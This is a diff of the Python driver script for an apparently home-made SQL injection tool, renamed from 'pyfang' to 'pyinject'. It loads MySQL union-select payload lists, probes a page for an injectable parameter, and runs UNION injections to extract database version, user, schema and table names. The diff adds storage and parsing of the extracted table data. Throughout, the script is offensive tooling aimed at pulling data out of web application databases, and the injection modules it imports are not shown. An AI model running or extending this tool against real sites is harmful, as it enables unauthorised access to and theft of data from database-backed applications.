@@ -1,5 +1,5 @@
 #!/usr/bin/python
-""" Driver program for pyfang. Handles user-defined options and calls appropriate modules.
+""" Driver program for pyinject. Handles user-defined options and calls appropriate modules.
 
     OPTIONS to support:
         -f:     \n-delimited text file of parameters to inject (default is mysql_params).
@@ -10,7 +10,7 @@
 """
 
 import os, sys, urllib2
-import builder, injector, scanner, parser, reporter
+import builder, datastore, injector, scanner, parser, reporter
 import json
 
 if __name__ == '__main__':
@@ -24,19 +24,12 @@ if __name__ == '__main__':
     # whitespace-delimited file
     mysql_params = open('./lists/mysql/basic_union.txt').read().split()
 
-    # Classes
+    # Instantiate classes used
     build = builder.Builder(page, mysql_params)
+    store = datastore.Store()
     fang = injector.Injector("")
     report = reporter.Reporter()
-    parse = parser.Parser()
-
-    """ 0) Find vuln. param
-        1) union select to get num cols
-        3) Get DB, user, version, etc
-        4) get table list, print interesting table names
-        5) select int. tables, get col # and names
-        6) grab selected col. info
-    """
+    parse = parser.Parser(store)
 
     # Get column data
     print '\n### Basic Page Structure ###'
@@ -45,15 +38,19 @@ if __name__ == '__main__':
     magic_num = int(fang.get_visible_param(page))
     print 'Magic Param','\t', magic_num
 
-    # Get data
+    # Get DB data
     print '\n### Basic DB Info ###'
     data = fang.injection(page, build.union(num_columns, magic_num)) 
     report.db_info(parse.db_values(data))
     data = fang.injection(page, build.schema_union(num_columns, magic_num)) 
     print parse.information_schema(data)
 
-    # Get data
+    # Get table data
     print '\n### DB Table Info ###'
-    print fang.injection(page, build.tables(num_columns, magic_num)) 
+    data = fang.injection(page, build.tables(num_columns, magic_num)) 
+    print parse.table(data)
+
+
+
 
 
